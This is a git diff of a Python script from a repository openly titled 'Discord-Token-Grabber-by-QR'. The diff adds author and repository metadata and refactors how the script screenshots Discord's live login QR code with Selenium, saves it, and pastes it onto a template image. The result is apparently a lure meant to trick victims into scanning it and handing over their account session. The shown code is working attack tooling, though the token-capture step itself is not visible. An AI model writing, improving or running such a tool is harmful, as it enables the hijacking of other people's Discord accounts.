@@ -1,3 +1,11 @@
+#!/usr/bin/env python3
+
+__author__ = "@hirushaadi"
+__version__ = "1.2"
+__license__ = "MIT"
+__repository__ = "https://github.com/hirusha-adi/Discord-Token-Grabber-by-QR"
+
+
 from bs4 import BeautifulSoup
 from selenium import webdriver
 from PIL import Image
@@ -6,6 +14,7 @@ import time
 import os
 from dtg import utitlites
 from selenium.webdriver.common.by import By
+
 
 
 def logo_qr():
@@ -17,7 +26,6 @@ def logo_qr():
 
 
 def paste_template():
-    print("STARTING FUNCTION 1")
     im1 = Image.open(os.path.join('image', 'template.png'), 'r')
     im2 = Image.open(os.path.join('image', 'final_qr.png'), 'r')
     im1.paste(im2, (120, 409))
@@ -65,31 +73,23 @@ def main():
     time.sleep(utitlites.Config.DISCORD_WAIT_TIME)
     print('- Page loaded.')
 
-    page_source = driver.page_source
 
-    soup = BeautifulSoup(page_source, features='html.parser')
-
-    div = soup.find('div', class_='qrCodeOverlay_ae8574')
-    qr_code = div.find('img')['src']
-
-    print(div)
-    print("="*50)
-    print(qr_code)
-    print("="*50)
-    file = os.path.join(os.getcwd(), 'image', 'qr_code.png')
-    print(file)
+    # old (with BeautifulSoup4)
+    # ---------
+    # page_source = driver.page_source
+    # soup = BeautifulSoup(page_source, features='html.parser')
+    # div = soup.find('div', class_='qrCodeOverlay_ae8574') # <div class="qrCodeOverlay_ae8574"><img alt="" src="/assets/911cd721660d605c4bf2.png"/></div>
+    # qr_code = div.find('img')['src'] # /assets/911cd721660d605c4bf2.png
     # image_element = driver.find_element(by=By.XPATH, value=f"//img[@src='{qr_code}']")
-    image_element = driver.find_element(by=By.XPATH, value=f"//div[@class='qrCodeOverlay_ae8574']")
-    print(image_element)
-    print(dir(image_element))
-    tmp = image_element.screenshot_as_png
-    print(tmp)
-    print(type(tmp))
 
-    with open("file.png", "wb") as file:
-        file.write(tmp)
+    # new (without BeautifulSoup4)
+    # ---------
+    image_element = driver.find_element(by=By.XPATH, value=f"//div[@class='qrCodeOverlay_ae8574']") # of type `selenium.webdriver.remote.webelement.WebElement`
+    original_qr_code_image = image_element.screenshot_as_png # of type `bytes`
 
-    exit()
+    file = os.path.join(os.getcwd(), 'image', 'qr_code.png')
+    with open(file, "wb") as handler:
+        handler.write(original_qr_code_image)
 
     discord_login = driver.current_url
     logo_qr()
